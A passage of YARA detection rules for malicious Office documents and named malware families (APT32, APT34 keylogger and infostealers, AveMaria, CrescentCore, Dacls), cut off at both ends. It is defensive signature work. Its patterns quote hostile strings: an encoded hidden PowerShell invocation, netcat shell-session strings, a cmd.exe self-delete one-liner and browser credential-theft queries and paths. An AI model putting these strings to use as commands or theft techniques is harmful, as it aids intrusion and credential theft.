		$s14 = "SaveToFile"
		$s15 = "SaveAs"
		$s16 = "SaveAsRTF"
		$s17 = "FileSaveAs"
		$s18 = "MkDir"
		$s19 = "RmDir"
		$s20 = "SaveSetting"
		$s21 = "SetAttr"
	condition:
            warning_vb_macro and 1 of them
}


rule warning_ole2link_embedded {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 1
        revision = "3"
        date = "September 12 2017"
        author = "David Cannings"
        copyright = "source https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Office%20zero-day%20(April%202017)/2017-04%20Office%20OLE2Link%20zero-day%20v0.4.md"
        tlp = "white"
        sigtype = "cryptam_warning"
        desc = "Office OLE2Link unsafe content such as remote risky content"
    strings:
        // Parsers will open files without the full 'rtf'
        $header_rtf = "{\\rt" nocase
        $header_office = { D0 CF 11 E0 }
        $header_xml = "<?xml version=" nocase wide ascii

        // Marks of embedded data (reduce FPs)
        // RTF format
        $embedded_object   = "\\object" nocase
        $embedded_objdata  = "\\objdata" nocase
        $embedded_ocx      = "\\objocx" nocase
        $embedded_objclass = "\\objclass" nocase
        $embedded_oleclass = "\\oleclsid" nocase
    
        // XML Office documents
        $embedded_axocx      = "<ax:ocx"  nocase wide ascii
        $embedded_axclassid  = "ax:classid"  nocase wide ascii

        // OLE format
        $embedded_root_entry = "Root Entry" wide
        $embedded_comp_obj   = "Comp Obj" wide
        $embedded_obj_info   = "Obj Info" wide
        $embedded_ole10      = "Ole10Native" wide

        $data0 = "00000300-0000-0000-C000-000000000046" nocase wide ascii
        $data1 = { 0003000000000000C000000000000046 }
        $data2 = "OLE2Link" nocase wide ascii
        $data3 = "4f4c45324c696e6b" nocase wide ascii
        $data4 = "StdOleLink" nocase wide ascii
        $data5 = "5374644f6c654c696e6b" nocase wide ascii

      condition:
        // Mandatory header plus sign of embedding, then any of the others
        1 of ($header*) and 1 of ($embedded*) 
            and (1 of ($data*))
    }

rule warning_EPS_xor_exec {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = true
        rank = 5
        revision = "1"
        date = "May 11 2017"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
        tlp = "green"
        sigtype = "cryptam_exploit"
        desc = "EPS obfuscation using xor and exec"
    strings:
	$h1 = "%!PS-Adobe-" nocase
        $s1 = "mod get xor put"
	$s2 = "exec quit"

    condition:
	$h1 at 0 and all of ($s*)
    }


rule warning_vbs_embed {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 3
		revision = "1"
		date = "May 18 2017"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Embedded vbs"
	strings:
		$s1 = {2e 76 62 73 00}
		$s2 = "Package"
		$s3 = {2e 00 76 00 62 00 73}
		$s4 = "Ole10Native" wide
	condition:
            3 of them
}

rule exploit_cve_2017_8759 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "September 12 2017"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
        tlp = "green"
        sigtype = "cryptam_exploit"
        desc = "OLE WSDL Parser Code Injection in PrintClientProxy CVE-2017-8759"
	
    strings:
        $c5 = "wsdl=" ascii wide nocase
        $c7 = "wsdl=http" ascii wide nocase
	$c1 = "ECABB0C7-7F19-11D2-978E-0000F8757E2A"
	$c2 = "SoapMoniker"
	$c3 = "c7b0abec-197f-d211-978e-0000f8757e2a"
	$c4 = "c7b0abec197fd211978e0000f8757e2a"
	$c6 = {c7b0abec197fd211978e0000f8757e2a}
        
    condition:
        warning_ole2link_embedded and 1 of ($c*)
}

rule warning_js_inzip {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 3
		revision = "1"
		date = "Oct 9 2017"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Embedded js"
	strings:
		$h1 = "PK"
		$s1 = {2e6a730a0020}
		$s2 = {2e6a73ad}
	condition:
            $h1 at 0 and all of ($s*)
}


rule warning_excel_dde_exec {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 5
		revision = "1"
		date = "Oct 10 2017"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Embedded js"
	strings:
        	$header_xml = "<?xml version=" nocase wide ascii
		$dde = "instrText>DDE"
	condition:
            $header_xml and $dde
}

rule warning_rtf_objupdate {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 2
		revision = "1"
		date = "Nov 20 2017"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "update RTF object may load malicious content"
	strings:
    	$header_xml = "{\\rt" nocase
		$upd = "\\objupdate" nocase
		
	condition:
		all of them
}

rule warning_powershell_strings {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = false
        rank = 5
        revision = "1"
        date = "Feb 15 2018"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
        tlp = "red"
        sigtype = "cryptam_exploit"
        desc = "Powershell"
    strings:
        $s1 = "powershell.exe"
	$s2 = "-nop -w hidden -encodedcommand"
	$s3 = "Package"
	$s4 = "Ole10Native" wide


    condition:
	3 of them
    }
/* 
 * QuickSand.io - Document malware forensics tool
 *
 * File  quicksand_general.yara  Dec 10 2016
 * Original source code available from https://github.com/tylabs/quicksand_lite
 * 
 * Decode and look in streams of Office Documents, RTF, MIME MSO.
 * XOR Database attack up to 256 byte keys to find embedded exe's.
 * Lite version - doesn't include cryptanalysis module and latest Office CVEs
 * Web version at http://quicksand.io/ has full features.
 *
 * Unless noted within the signature, signatures are subject to the terms
 * of the Mozilla Public License, v. 2.0. If a copy of the MPL was not
 * distributed with this file, You can obtain one at http://mozilla.org/MPL/2.0/. 
 */

rule doc_exploit_ms12_060_toolbar
{
	meta:
		author = "@tylabs"
	strings:
		$a = "MSComctlLib.Toolbar.2"
		$b = {4D53436F6D63746C4C69622E546F6F6C6261722E32}
	condition:
		any of them
}


rule winrar_sfx {
	meta:
		author = "@tylabs"
	strings:
		$u1 = "d:\\Projects\\WinRAR\\SFX\\build\\sfxrar32\\Release\\sfxrar.pdb"
	condition:
		any of them
}


rule this_alt_key
{
	meta:
		author = "@tylabs"
		hash = "821f7ef4349d542f5f34f90b10bcc690"
	strings:
		$a = {79 BA 1E 6F E1 16 79 DF 32 88 FE 29 C9 ED 52 B6 13 4D B3 4C 73 D3 7B 72 D0 24 CF FD 57 FE C7 67 9E 52 7A D3 05 63}
	condition:
		any of them
}

rule this_dbl_xor
{
	meta:
		author = "@tylabs"
		hash = "d85d54434e990e84a28862523c277057"
	strings:
		$a = {86 BB BD A6 F6 A7 5A 46 4D 59 4D 40 0E 4C 41 4F 4C 4C 50 05 44 42 18 4B 4F 55 1C 54 50 1F 74 7E 61 13 59 5A 52 52 }
	condition:
		any of them
}

rule gen_ie_secrets {
	meta:
		author = "@tylabs"
 	strings:
 		$a = "abe2869f-9b47-4cd9-a358-c22904dba7f7"
 	condition:
 		all of them
}

rule compiler_midl
{
	meta:
		author = "@tylabs"

        strings:
		$s1 = "Created by MIDL version " wide
	condition:
		any of them
}



rule compression_ucl
{
	meta:
		author = "@tylabs"
        strings:
                $s1 = "UCL data compression library." wide
		$s2 = "Id: UCL version:" wide
	condition:
		all of them
}

rule coms_openssl
{
	meta:
		author = "@tylabs"
	strings:
                $s1 = ".\\ssl\\ssl_lib.c"
		$s2 = ".\\ssl\\ssl_sess.c"
		$s3 = "part of OpenSSL"
	condition:
		all of them
}




rule netcat
{
	meta:
		author = "@tylabs"
    		comment = "tool"

	strings:
    		$a = "Failed to create ReadShell session thread, error = %s"
    		$b = "Failed to create shell stdout pipe, error = %s"
 
	condition:
   		all of them 
}


rule apt_template_tran_duy_linh
{
	meta:
		author = "@tylabs"
          	info = "author"
	strings:
		$auth = { 4E 6F 72 6D 61 6C 2E 64 6F 74 6D 00 1E 00 00 00 10 00 00 00 54 72 61 6E 20 44 75 79 20 4C 69 6E 68 }

	condition:
		$auth
}

rule theme_MH370 {
	meta:
		author = "@tylabs"
		version = "1.0"
		date = "2014-04-09"
	strings:
		$callsign1 = "MH370" ascii wide nocase fullword
		$callsign2 = "MAS370" ascii wide nocase fullword
		$desc1 = "Flight 370" ascii wide nocase fullword

	condition:
		any of them
}

rule theme_MH17 {
	meta:
		author = "@tylabs"
		version = "1.0"
		date = "2014-04-09"
	strings:
		$callsign1 = "MH17" ascii wide nocase fullword
		$callsign2 = "MAS17" ascii wide nocase fullword
		$desc1 = "malaysia airlines flight 17" ascii wide nocase

	condition:
		any of them
}



rule openxml_remote_content
{
	meta:
		author = "@tylabs"
		ref = "https://www.defcon.org/html/defcon-22/dc-22-speakers.html#Crenshaw"
		date = "Aug 10 2014"
		hash = "63ea878a48a7b0459f2e69c46f88f9ef"

	strings: 
		$a = "schemas.openxmlformats.org" ascii nocase
		$b = "TargetMode=\"External\"" ascii nocase

	condition:
		all of them
}


rule office97_guid
{
	meta:
		author = "@tylabs"
		ref = "http://search.lores.eu/fiatlu/GUIDnumber.html"
		
	strings:
		$a = "_PID_GUID"
		$magic = {D0 CF 11 E0}

	condition:
		$magic at 0 and $a
}

rule InceptionRTF {
	meta: 
		author = "Blue Coat Systems, Inc"
		reference = "http://goo.gl/qr7BP4"
		date = "12/10/2014"
		description = "Used by unknown APT actors: Inception"
	strings:
		$a = "}}PT@T"
		$b = "XMLVERSION \"3.1.11.5604.5606"
		$c = "objclass Word.Document.12}\\objw9355" 
	condition:
		all of them
}

rule mime_mso
{
	meta:
		author = "@tylabs"
		comment = "mime mso detection"
	strings:
		$a="application/x-mso"
		$b="MIME-Version"
		$c="ocxstg001.mso"
		$d="?mso-application"
	condition:
		$a and $b or $c or $d
}


rule mime_mso_embedded_SuppData
{
	meta:
		author = "@tylabs"
    		comment = "mime mso office obfuscation"
    		hash = "77739ab6c20e9dfbeffa3e2e6960e156"
		date = "Mar 5 2015"

	strings:
		$a = "docSuppData"
		$b = "binData"
		$c = "schemas.microsoft.com"

	condition:
		all of them
}


rule mime_mso_embedded_ole
{
	meta:
		author = "@tylabs"
    		comment = "mime mso office obfuscation"
    		hash = "77739ab6c20e9dfbeffa3e2e6960e156"
		date = "Mar 5 2015"

	strings:
    		$a = "docOleData"
    		$b = "binData"
    		$c = "schemas.microsoft.com"
 
	condition:
    		all of them
}




rule mime_mso_vba_macros
{
	meta:
		author = "@tylabs"
		comment = "mime mso office obfuscation"
		hash = "77739ab6c20e9dfbeffa3e2e6960e156"
		date = "Mar 5 2015"

	strings:
		$a = "macrosPresent=\"yes\""
		$b = "schemas.microsoft.com"

	condition:
		all of them
}

rule ExOleObjStgCompressedAtom { 
	meta:
		author = "@tylabs"
		date   = "2015 06 09"
		ref    = "http://www.threatgeek.com/2015/06/fidelis-threat-advisory-1017-phishing-in-plain-sight.html"
		hashes = "2303c3ad273d518cbf11824ec5d2a88e"
	strings: 
		$head = { 10 00 11 10 }
		$magic = { D0 CF 11 E0 }
		$openxml = "Package0" wide
	
	condition:
		($magic at 0) and $head and $openxml
}



rule office_encryption { 
	meta:
		author = "@tylabs"
		date   = "2015 06 22"
	strings: 
		$sig1 = "Microsoft Base Cryptography Provider v" wide
		$sig2 = "EncryptedSummary" wide
		$magic = { D0 CF 11 E0 }
	
	condition:
		($magic at 0) and (1 of ($sig*))

}

rule ACBackdoor_ELF: linux malware backdoor
{
    meta:
        author = "Adam M. Swanda"
        date = "Nov 2019"
        reference = "https://www.intezer.com/blog-acbackdoor-analysis-of-a-new-multiplatform-backdoor/"

    strings:
        $ua_str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" ascii fullword
        $header1 = "Access-Control:" ascii fullword
        $header2 = "X-Access" ascii

        $initd = "/etc/init.d/update-notifier" ascii fullword
        $str001 = "#!/bin/sh -e" ascii fullword
        $str002 = "### BEGIN INIT INFO" ascii fullword
        $str003 = "# Provides:          update-notifier" ascii fullword
        $str004 = "# Required-Start:    $local_fs" ascii fullword
        $str005 = "# Required-Stop:" ascii fullword
        $str006 = "# Default-Start:     S" ascii fullword
        $str007 = "# Default-Stop:" ascii fullword
        $str008 = "### END INIT INFO" ascii fullword
        $str010 = "  *) echo \"Usage: $0 {start|stop|restart|force-reload}\" >&2; ;;" ascii fullword
        $str011 = "esac" ascii fullword
        $str012 = "[ -x /usr/local/bin/update-notifier ] \\" ascii fullword
        $str013 = "    && exec /usr/local/bin/update-notifier" ascii fullword
        $rcd01 = "/etc/rc2.d/S01update-notifier" ascii fullword
        $rcd02 = "/etc/rc3.d/S01update-notifier" ascii fullword
        $rcd03 = "/etc/rc5.d/S01update-notifier" ascii fullword

    condition:
        /* trigger = '{7f 45 4c 46}' - ELF magic bytes */
        (uint32be(0x0) == 0x7f454c46)
        and
        (
            ($ua_str and all of ($header*) and $initd and all of ($rcd*))
            or
            (
                $ua_str and all of ($header*) and 10 of ($str*)
            )
        )
}
rule APT32_KerrDown: apt apt32 winmalware downloader
{
    meta:
        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-08-08"
        Note = "List of samples used to create rule at end of file as block comment"

    strings:
        $hijack = "DllHijack.dll" ascii fullword
        $fmain = "FMain" ascii fullword
        $gfids = ".gfids" ascii fullword
        $sec01 = ".xdata$x" ascii fullword
        $sec02 = ".rdata$zzzdbg" ascii fullword
        $sec03 = ".rdata$sxdata" ascii fullword

        $str01 = "wdCommandDispatch" ascii fullword
        $str02 = "TerminateProcess" ascii fullword
        $str03 = "IsProcessorFeaturePresent" ascii fullword
        $str04 = "IsDebuggerPresent" ascii fullword
        $str05 = "SetUnhandledExceptionFilter" ascii fullword
        $str06 = "QueryPerformanceCounter" ascii fullword

condition:
        (uint16(0) == 0x5a4d)
        and
        (
            ($hijack and $fmain and $gfids)
            or
            ($gfids and 6 of them)
        )
}

/*
    Matched sample set:

        4a0309d8043e8acd7cb5c7cfca95223afe9c15a1c34578643b49ded4b786506b
        4b431af677041dae3c988fcc901ac8ec6e74c6e1467787bf099c4abd658be5be
        4bc00f7d638e042da764e8648c03c0db46700599dd4f08d117e3e9e8b538519b
        4e2f8f104e6cd07508c5b7d49737a1db5eeba910adfdb4c19442a7699dc78cfc
        4e791f2511c9bd3c63c8e37aa6625d8b590054de9e1cca13a7be2630bc2af9ce
        539e8a53db3f858914cfe0d2132f11de34a691391ba71673a8b1e61367a963c7
        53cd92f37ffd0822cc644717363ba239d75c6d9af0fa305339eaf34077edd22d
        53efaac9244c24fab58216a907783748d48cb32dbdc2f1f6fb672bd49f12be4c
        5c18c3e6f7ac0d0ac2b5fa9a6435ee90d6bd77995f85bed9e948097891d42ca2
        5f0db8216314da1f128b883b918e5ac722202a2ae0c4d0bf1c5da5914a66778e
        6010d44cdca58cdec4559040e08798e7b28b9434bda940da0a670c93c84e33cd
        60b65ebb921dca4762aef427181775d10bbffc30617d777102762ab7913a5aa1
        6146aedfe47597606fb4b05458ec4b99d4e1042da7dc974fa33a57e282cd7349
        6245b74b1cc830ed95cb630192c704da66600b90a331d9e6db70210acb6c7dfa
        67cd191eb2322bf8b0f04a63a9e7cb7bc52fb4a4444fcb8fed2963884aede3aa
        68f77119eae5e9d2404376f2d87e71e4ab554c026e362c57313e5881005ae79e
        69e679daaaff3832c39671bf2b813b5530a70fb763d381f9a6e22e3bc493c8a9
        6fb397e90f72783adec279434fe805c732ddb7d1d6aa72f19e91a1bf585e1ea5
        70db041fb5aadb63c1b8ae57ba2699baa0086e9b011219dcebcccbf632017992
        7673f5468ba3cf01500f6bb6a19ce7208c8b6fc24f1a3a388eca491bc25cd9cd
        77805a46f73e118ae2428f8c22ba28f79f7c60aeb6305d41c0bf3ebb9ce70f94
        788265447391189ffc1956ebfec990dc051b56f506402d43cd1d4de96709c082
        7be613237b57fbc3cb83d001efadeed9936a2f519c514ab80de8285bdc5a666c
        7dbb7fab4782f5e3b0c416c05114f2a51f12643805d5f3d0cd80d32272f2731a
        7ec77e643d8d7cc18cc67c123feceed91d10db1cc9fa0c49164cba35bb1da987
        860f165c2240f2a83eb30c412755e5a025e25961ce4633683f5bc22f6a24ddb6
        89759e56d5c23085e47d2be2ce4ad4484dfdd4204044a78671ed434cec19b693
        8b7fb1cd5c09f7ec57ccc0c4261c0b4df0604962556a1d401b9cbfd750df60ba
        8d6e31c95d649c08cdc2f82085298173d03c03afe02f0dacb66dd3560149184f
        942d763604d0aefdff10ce095f806195f351124a8433c96f5590d89d809a562f
        98a5f30699564e6d9f74e737a611246262907b9e91b90348f7de53eb4cf32665
        9e6011d6380207e2bf5105cde3d48e412db565b92cdc1b3c6aa15bd7bd4b099f
        a106e0a6b7cc30b161e5ea0b1ec0f28ab89c2e1eb7ba2d5d409ddbabc3b037e6
        a2b905c26e2b92e63de85d83e280249258cb21f300d8c4a3a6bdb488676e9bcf
        a4a86e96f95f395fcf0ceb6a74a2564f4ba7adbe1b40cc702b054427327a0399
        a8192656dd1db0be4cec9d03b4d10e0529d9c52c899eda8d8e72698acfb61419
        a8f776bd3a9593e963b567ce790033fec2804ea0afb40a92d40e21d8f33d066f
        b4966f8febdba6b2d674afffc65b1df11e7565acbd4517f1e5b9b36a8c6a16ed
        bb25f1a73d095d57b2c8c9ac6780e4d412ddf3d9eef84a54903cc8e4eaefc335
        bc82bce004afb6424e9d9f9fc04a84f58edf859c4029eda08f7309dbeec67696
        c30198e0b0e470d4ac8821bd14bb754466e7974f1c20be8b300961e9e89ed1ea
        caabc45e59820a4349db13f337063eddede8a0847ae313d89a800f241d8556c8
        d3ef6643ad529d43a7ec313b52c8396dc52c4daad688360eb207ee91a1caf7b2
        e3c818052237bb4bb061290ab5e2a55c3852c8a3fef16436b1197e8b17de2e18
        e56ffcf5df2afd6b151c24ddfe7cd450f9208f59b5731991b926af0dce24285a
        e8704bf6525c90e0f5664f400c3bf8ff5da565080a52126e0e6a62869157dfe3
        e8a454cd8b57a243f0abeec6945c9b10616cfdcc4abfb4c618bfc469d026d537
        eac776c3c83c9db1a770ffaf6df9e94611c8293cbd41cb9257148603b8f2be0b
        ead0f3e6f0ca16b283f09526d09e8e8cba687dab642f0e102e5487cb565bf475
        f011a136996fa53fdbde944da0908da446b9532307a35c44ed08241b5e602cc9
        f2a2f4fa2ed5b2a94720a4661937da97ab21aa198a5f8c83bb6895aa2c398d22
        f62f21ee7e642f272b881827b45ceb643c999a742e1d3eac13d1ba014d1e7f67
        f9f0973dc74716b75291f5a9b2d59b08500882563011d1def2b8d0b1b9bbb8ae
*/
rule APT32_Ratsnif: apt32 trojan winmalware
{
    meta:
        Author = "Adam M. Swanda"
        Website = "https://www.deadbits.org"
        Repo = "https://github.com/deadbits/yara-rules"
        Date = "2019-07-18"

    strings:
        $pdb0 = "X:\\Project\\BotFrame\\Debug\\Client.pdb" ascii fullword

        $str1 = "LastIP" ascii fullword
        $str2 = "LastOnline" ascii fullword
        $str3 = "LoaderType" ascii fullword
        $str4 = "Payload" ascii fullword
        $str5 = "PayloadFile" ascii fullword
        $str6 = "ClientCommand" ascii fullword
        $str7 = "ClientId" ascii fullword
        $str8 = "UserAdmin" ascii fullword
        $str9 = "User" ascii fullword
        $str10 = "Password" ascii fullword
        $str11 = "Access" ascii fullword
        $str12 = "CreateDate" ascii fullword
        $str13 = "CreateBy" ascii fullword
        $str14 = "UserName" ascii fullword
        $str15 = "ComputerName" ascii fullword
        $str16 = "Domain" ascii fullword
        $str17 = "OSType" ascii fullword
        $str18 = "OSArch" ascii fullword
        $str19 = "OSVer" ascii fullword
        $str20 = "InstallDate" ascii fullword
        $str21 = "LastLoadCommandID" ascii fullword
        $str22 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" ascii fullword
        $str25 = "#########################Program starting up#########################" ascii fullword
        $str26 = "Stop poison" ascii fullword
        $str27 = "Shell:" ascii fullword
        $str28 = "shell" ascii fullword
        $str29 = "Select http redirect domain:" ascii fullword
        $str30 = "HTTP redirect add file extension:" ascii fullword
        $str32 = "exIp" ascii fullword
        $str33 = "Start Poison" ascii fullword
        $str34 = "vicIP" ascii fullword
        $str35 = "Insert JSTag" ascii fullword
        $str36 = "devIp" ascii fullword
        $str37 = "TransmitTcp" ascii fullword
        $str38 = "Remove poison IP: %s" ascii fullword
        $str39 = "Remove my ip or gateway ip: %s" ascii fullword

        $cnc0 = "/cl_client_online.php" ascii fullword
        $cnc1 = "/cl_client_cmd.php" ascii fullword
        $cnc2 = "/cl_client_cmd_res.php" ascii fullword
        $cnc3 = "/cl_client_file_download.php" ascii fullword
        $cnc4 = "/ad_file_download.php" ascii fullword
        $cnc5 = "/cl_client_file_upload.php" ascii fullword
        $cnc6 = "/cl_client_logs.php" ascii fullword

    condition:
        (uint16(0) == 0x5a4d)
        and
        (
            (10 of ($str*) and 3 of ($cnc*))
            or
            (3 of ($cnc*) and $pdb0)
        )
}
rule APT34_LONGWATCH: apt34 winmalware keylogger
{
    meta:
        Description = "APT34 Keylogger"
        Reference = "https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html"

    strings:
        $log = "c:\\windows\\temp\\log.txt" ascii fullword
        $clipboard = "---------------CLIPBOARD------------" ascii fullword

        $func0 = "\"Main Invoked.\"" ascii fullword
        $func1 = "\"Main Returned.\"" ascii fullword

        $logger3 = ">---------------------------------------------------" ascii fullword
        $logger4 = "[ENTER]" ascii fullword
        $logger5 = "[CapsLock]" ascii fullword
        $logger6 = "[CRTL]" ascii fullword
        $logger7 = "[PAGE_UP]" ascii fullword
        $logger8 = "[PAGE_DOWN]" ascii fullword
        $logger9 = "[HOME]" ascii fullword
        $logger10 = "[LEFT]" ascii fullword
        $logger11 = "[RIGHT]" ascii fullword
        $logger12 = "[DOWN]" ascii fullword
        $logger13 = "[PRINT]" ascii fullword
        $logger14 = "[PRINT SCREEN]" ascii fullword
        $logger15 = "[INSERT]" ascii fullword
        $logger16 = "[SLEEP]" ascii fullword
        $logger17 = "[PAUSE]" ascii fullword
        $logger18 = "[TAB]" ascii fullword
        $logger19 = "[ESC]" ascii fullword
        $logger20 = "[DEL]" ascii fullword
        $logger21 = "[ALT]" ascii fullword

    condition:
        uint16(0) == 0x5a4d
        and
        $log
        and
        all of ($func*)
        and
        all of ($logger*)
        and $clipboard
}
rule APT34_PICKPOCKET: apt apt34 infostealer winmalware
{
   meta:
      Description = "Detects the PICKPOCKET malware used by APT34, a browser credential-theft tool identified by FireEye in May 2018"
      Reference = "https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html"

   strings:
      $s1 = "SELECT * FROM moz_logins;" ascii fullword
      $s2 = "\\nss3.dll" ascii fullword
      $s3 = "SELECT * FROM logins;" ascii fullword
      $s4 = "| %Q || substr(name,%d+18) ELSE name END WHERE tbl_name=%Q COLLATE nocase AND (type='table' OR type='index' OR type='trigger');" ascii fullword
      $s5 = "\\Login Data" ascii fullword
      $s6 = "%s\\Mozilla\\Firefox\\profiles.ini" ascii fullword
      $s7 = "Login Data" ascii fullword
      $s8 = "encryptedUsernamencryptedPasswor" ascii fullword
      $s10 = "%s\\Mozilla\\Firefox\\%s" ascii fullword
      $s11 = "encryptedUsername" ascii fullword
      $s12 = "2013-12-06 14:53:30 27392118af4c38c5203a04b8013e1afdb1cebd0d" ascii fullword // SQLITE_SOURCE_ID
      $s13 = "27392118af4c38c5203a04b8013e1afdb1cebd0d" ascii
      $s15 = "= 'table' AND name!='sqlite_sequence'   AND coalesce(rootpage,1)>0" ascii fullword
      $s18 = "[*] FireFox :" fullword wide
      $s19 = "[*] Chrome :" fullword wide
      $s20 = "username_value" ascii fullword
   condition:
      uint16(0) == 0x5a4d
      and 
      (
         8 of them or all of them
      )
}
rule APT34_VALUEVAULT: apt34 infostealer winmalware
{
    meta:
        Description= "Information stealing malware used by APT34, written in Go."
        Reference = "https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html"

    strings:
        $fsociety = "fsociety.dat" ascii

        $powershell = "New-Object -ComObject Shell.Application" ascii

        $gobuild = "Go build ID: " ascii

        $gopath01 = "browsers-password-cracker" ascii nocase
        $gopath02 = "main.go" ascii nocase
        $gopath03 = "mozilla.go" ascii nocase
        $gopath04 = "ie.go" ascii nocase
        // main.go, mozilla.go, ie.go, etc etc... this should probably be a regex but this works too i guess :|

        // some function names
        $str1 = "main.Decrypt" ascii fullword
        $str3 = "main.NewBlob" ascii fullword
        $str4 = "main.CheckFileExist" ascii fullword
        $str5 = "main.CopyFileToDirectory" ascii fullword
        $str6 = "main.CrackChromeBased" ascii fullword
        $str7 = "main.CrackIE" ascii fullword
        $str8 = "main.decipherPassword" ascii fullword
        $str9 = "main.DecodeUTF16" ascii fullword
        $str10 = "main.getHashTable" ascii fullword
        $str11 = "main.getHistory" ascii fullword
        $str12 = "main.getHistoryWithPowerShell" ascii fullword
        $str13 = "main.getHistoryFromRegistery" ascii fullword
        $str14 = "main.main" ascii fullword
        $str15 = "main.DecryptAESFromBase64" ascii fullword
        $str16 = "main.DecryptAES" ascii fullword

        // typo of Mozilla is intentional
        $str17 = "main.CrackMozila" ascii fullword
        $str18 = "main.decodeLoginData" ascii fullword
        $str19 = "main.decrypt" ascii fullword
        $str20 = "main.removePadding" ascii fullword
        $str21 = "main.getLoginData" ascii fullword
        $str22 = "main.isMasterPasswordCorrect" ascii fullword
        $str23 = "main.decrypt3DES" ascii fullword
        $str24 = "main.getKey" ascii fullword
        $str25 = "main.manageMasterPassword" ascii fullword
        $str26 = "main.getFirefoxProfiles" ascii fullword
        $str27 = "main._Cfunc_DumpVault" ascii fullword
        $str28 = "main.CrackIEandEdgeNew" ascii fullword
        $str29 = "main.init.ializers" ascii fullword
        $str30 = "main.init" ascii fullword

    condition:
        uint16(0) == 0x5a4d
        and
        (
            (10 of ($str*) and 3 of ($gopath*))
            or
            ($fsociety and $powershell and $gobuild)
            or
            ($fsociety and 10 of ($str*))
        )
}
rule AveMaria_WarZone: avemaria warzone winmalware infostealer
{

    meta:
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-18"

   strings:
      $str1 = "cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q " ascii fullword
      $str2 = "MsgBox.exe" wide fullword
      $str4 = "\\System32\\cmd.exe" wide fullword
      $str6 = "Ave_Maria" wide
      $str7 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" ascii fullword
      $str8 = "SMTP Password" wide fullword
      $str11 = "\\Google\\Chrome\\User Data\\Default\\Login Data" wide fullword
      $str12 = "\\sqlmap.dll" wide fullword
      $str14 = "SELECT * FROM logins" ascii fullword
      $str16 = "Elevation:Administrator!new" wide
      $str17 = "/n:%temp%" ascii wide

   condition:
      (
        uint16(0) == 0x5a4d and filesize < 400KB
      )
      and
      (
        5 of ($str*)
        or all of them
      )
}

rule CrescentCore_DMG: installer macosmalware
{

    meta:
      Author = "Adam M. Swanda"
      Website = "https://www.deadbits.org"
      Repo = "https://github.com/deadbits/yara-rules"
      Date = "2019-07-18"

   strings:
      $header0 = "__PAGEZERO" ascii
      $header1 = "__TEXT" ascii

      $path0 = "/Users/mehdi/Desktop/RED MOON/Project/WaningCrescent/WaningCrescent/" ascii

      $install0 = ".app\" /Applications" ascii fullword
      $install1 = "open \"/Applications/" ascii fullword

      $str1 = /Flash_Player\dVirusMp/ ascii
      $str2 = /Flash_Player\dAntivirus33/ ascii
      $str3 = /Flash_Player\d{2}Armageddon/ ascii
      $str4 = /Flash_Player\d{2}Armageddon\w\dapocalypsyy/
      $str5 = /Flash_Player\d{2}Armageddon\w\ddoomsdayyy/

      $str6 = /SearchModel\w\dbrowser/
      $str8 = /SearchModel\w\dcountry/
      $str9 = /SearchModel\w\dhomepage/
      $str10 = /SearchModel\w\dthankyou/
      $str11 = /SearchModel\w\dinterrupt/
      $str12 = /SearchModel\w\dsearch/
      $str13 = /SearchModel\w\dsuccess/
      $str14 = /SearchModel\w\d{2}carrierURL/

   condition:
      (
        uint32(0) == 0xfeedface or
        uint32(0) == 0xcefaedfe or
        uint32(0) == 0xfeedfacf or
        uint32(0) == 0xcffaedfe or
        uint32(0) == 0xbebafeca
      ) and $header0 and $header1
      and
      (
        ($path0 and (any of ($install*)))
        or (5 of ($str*))
      )
      or all of them
}

rule Dacls_Trojan_Linux
{
    meta:
        Author = "Adam M. Swanda"
        Repo = "https://github.com/deadbits/yara-rules"

    strings:
        $cls00 = "c_2910.cls" ascii fullword
        $cls01 = "k_3872.cls" ascii fullword

        $str00 = "{\"result\":\"ok\"}" ascii fullword
        $str01 = "SCAN  %s  %d.%d.%d.%d %d" ascii fullword
        $str02 = "/var/run/init.pid" ascii fullword
        $str03 = "/flash/bin/mountd" ascii fullword
        $str04 = "Name:" ascii fullword
        $str05 = "Uid:" ascii fullword
        $str06 = "Gid:" ascii fullword
        $str08 = "PPid:" ascii fullword
        $str09 = "session_id" ascii fullword

    condition:
        uint32be(0x0) == 0x7f454c46
        and
        (
            (all of ($cls*))

            or

